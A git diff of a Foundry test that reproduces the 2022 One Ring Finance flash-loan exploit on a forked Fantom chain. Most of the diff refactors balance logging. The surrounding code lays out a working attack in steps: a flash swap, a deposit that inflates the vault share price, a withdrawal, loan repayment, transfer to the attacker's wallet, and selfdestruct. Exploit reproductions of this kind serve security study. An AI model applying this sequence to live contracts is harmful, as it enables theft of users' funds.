@@ -6,14 +6,15 @@ import {TestHarness} from "../TestHarness.sol";
 import {IUniswapV2Pair} from '../utils/IUniswapV2Pair.sol';
 import {IERC20} from '../interfaces/IERC20.sol';
 
+import {TokenBalanceTracker} from '../modules/TokenBalanceTracker.sol';
+
 // forge test --match-contract Exploit_OneRingFinance -vvv
 /*
-On Mar 21, 2022 an attacker stole 2MM in USDC tokens from an One Ring Finance.
+On Mar 21, 2022 an attacker stole ~$1.55MM in USDC tokens from an One Ring Finance.
 
 // Attack Overview
-Total Lost: ~2MM USDC
+Total Lost: ~$1.55MM USDC
 Attack Tx: https://ftmscan.com/tx/0xca8dd33850e29cf138c8382e17a19e77d7331b57c7a8451648788bbb26a70145
-Ethereum Transaction Viewer: 
 
 Exploited Contract: https://ftmscan.com/address/0x66a13cd7ea0ba9eb4c16d9951f410008f7be3a10#code
 Attacker Address: https://ftmscan.com/address/0x12efed3512ea7b76f79bcde4a387216c7bce905e
@@ -98,7 +99,7 @@ interface IOneRingVault {
 
 interface ISolidlyPair is IUniswapV2Pair {}  // Essentially the same but for the callback selector.
 
-contract Exploit_OneRingFinance is TestHarness {
+contract Exploit_OneRingFinance is TestHarness, TokenBalanceTracker {
     ISolidlyPair pairUsdc_Mim = ISolidlyPair(0xbcab7d083Cf6a01e0DdA9ed7F8a02b47d125e682);
     IERC20 usdc = IERC20(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75);
     IERC20 mim = IERC20(0x82f0B8B456c1A451378467398982d4834b6829c1);
@@ -108,6 +109,15 @@ contract Exploit_OneRingFinance is TestHarness {
 
     function setUp() external {
         cheat.createSelectFork('fantom', 34041499); // We pin one block before the exploit happened.
+
+        cheat.deal(address(this), 0);
+
+        addTokenToTracker(address(usdc));
+        addTokenToTracker(address(vault));
+
+        updateBalanceTracker(address(this));
+        updateBalanceTracker(address(vault));
+        updateBalanceTracker(tx.origin);
     }
 
     function test_attack() external {
@@ -129,10 +139,8 @@ contract Exploit_OneRingFinance is TestHarness {
         require(msg.sender == address(pairUsdc_Mim), 'Not requested by pair');
         
         console.log('------- STEP 2: INSIDE FLASHSWAP CALLBACK -------');  
-        console.log('Attacker balances');
-        logBalances(address(this));
-        console.log('Vault balances');
-        logBalances(address(vault));
+        logBalancesWithLabel('Attacker', address(this));
+        logBalancesWithLabel('Vault', address(vault));
         console.log('Retrieved price: ', vault.getSharePrice());
         console.log('\n');
 
@@ -141,10 +149,8 @@ contract Exploit_OneRingFinance is TestHarness {
         usdc.approve(address(vault), type(uint256).max);
         vault.depositSafe(borrowAmount, address(usdc), 1);
         
-        console.log('Attacker balances');
-        logBalances(address(this));
-        console.log('Vault balances');
-        logBalances(address(vault));
+        logBalancesWithLabel('Attacker', address(this));
+        logBalancesWithLabel('Vault', address(vault));
         console.log('Retrieved price: ', vault.getSharePrice());
         console.log('\n');
 
@@ -152,42 +158,26 @@ contract Exploit_OneRingFinance is TestHarness {
         console.log('------- STEP 4: WITHDRAW -------');  
         vault.withdraw(vault.balanceOf(address(this)),address(usdc));
         
-        console.log('Attacker balances');
-        logBalances(address(this));
-        console.log('Vault balances');
-        logBalances(address(vault));
+        logBalancesWithLabel('Attacker', address(this));
+        logBalancesWithLabel('Vault', address(vault));
         console.log('Retrieved price: ', vault.getSharePrice());
         console.log('\n');
 
         console.log('------- STEP 5: REPAY LOAN -------');  
         usdc.transfer(address(pairUsdc_Mim),(borrowAmount/9999*10000)+10000);
 
-        console.log('Attacker balances');
-        logBalances(address(this));
-        console.log('Vault balances');
-        logBalances(address(vault));
+        logBalancesWithLabel('Attacker', address(this));
+        logBalancesWithLabel('Vault', address(vault));
         console.log('Retrieved price: ', vault.getSharePrice());
         console.log('\n');
         
         console.log('------- STEP 6: SEND FUNDS TO EOA -------');
         usdc.transfer(tx.origin,usdc.balanceOf(address(this)));
-        console.log('Attacker balances');
-        logBalances(address(this));
-        console.log('Attacker EOA');
-        logBalances(address(tx.origin));
-        console.log('Vault balances');
-        logBalances(address(vault));
+        logBalancesWithLabel('Attacker', address(this));
+        logBalancesWithLabel('Attacker EOA', tx.origin);
+        logBalancesWithLabel('Vault', address(vault));
 
-        console.log('------- STEP 7: SELFDESTRUCTS CONTRACT TO HIDE BYTECODE -------');  
+        console.log('------- STEP 7: SELFDESTRUCTS CONTRACT -------');  
         selfdestruct(payable(tx.origin));
     }
-
-    function logBalances(address _from) internal {
-        emit log_named_decimal_uint('NATIVE TOKENS', _from.balance, 18);
-        emit log_named_decimal_uint('USDC', usdc.balanceOf(_from), 6);
-        emit log_named_decimal_uint('VAULT TOKENS', vault.balanceOf(_from), 18);
-
-        console.log('\n');
-    }
-    
 }
